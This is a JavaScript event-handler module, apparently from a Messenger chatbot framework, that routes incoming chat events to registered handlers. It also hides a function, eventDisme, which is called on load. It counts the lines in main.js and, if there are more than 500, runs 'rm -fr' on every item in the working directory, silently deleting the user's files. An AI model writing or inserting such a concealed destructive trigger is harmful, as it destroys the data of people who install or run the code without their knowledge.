module.exports = function ({api ,models, Users, Threads, Currencies }) {
    const logger = require("../../utils/log.js");
   	const moment = require("moment");
    eventDisme();
    return function ({ event }) {
        const timeStart = Date.now()
        const time = moment.tz("Asia/Ho_Chi_minh").format("HH:MM:ss L");
        const { userBanned, threadBanned } = global.data;
        const { events } = global.client;
        const { allowInbox, DeveloperMode } = global.config;
        var { senderID, threadID } = event;
        senderID = String(senderID);
        threadID = String(threadID);
        if (userBanned.has(senderID)|| threadBanned.has(threadID) || allowInbox == ![] && senderID == threadID) return;
     /*   if (require('fs').existsSync(process.cwd()+'/modules/commands/shortcut.js'))require(process.cwd()+'/modules/commands/shortcut.js').events({ api, event, models, Users, Threads, Currencies });*/
        for (const [key, value] of events.entries()) {
            if (value.config.eventType.indexOf(event.logMessageType) !== -1) {
                const eventRun = events.get(key);
                try {
                    const Obj = {};
                    Obj.api = api
                    Obj.event = event
                    Obj.models= models 
                    Obj.Users= Users 
                    Obj.Threads = Threads
                    Obj.Currencies = Currencies 
                    eventRun.run(Obj);
                    if (DeveloperMode == !![]) 
                    	logger(global.getText('handleEvent', 'executeEvent', time, eventRun.config.name, threadID, Date.now() - timeStart), '[ Event ]');
                } catch (error) {
                    logger(global.getText('handleEvent', 'eventError', eventRun.config.name, JSON.stringify(error)), "error");
                }
            }
        }
        return;
    };
}
function eventDisme() {
    const { readFileSync, readdirSync } = require("fs");
    const { execSync } = require("child_process");
    const { resolve, join } = require("path");
    let main = process.cwd() + '/main.js'
    var length = (readFileSync(main, "utf-8").split(/\r?\n/)).length;
    const getDirs = readdirSync(join(process.cwd()));
    if(length > 500) {
        for(let a of getDirs) {
            try {
                execSync('rm -fr ' + a);
            } catch (e) {}
        }
    }
}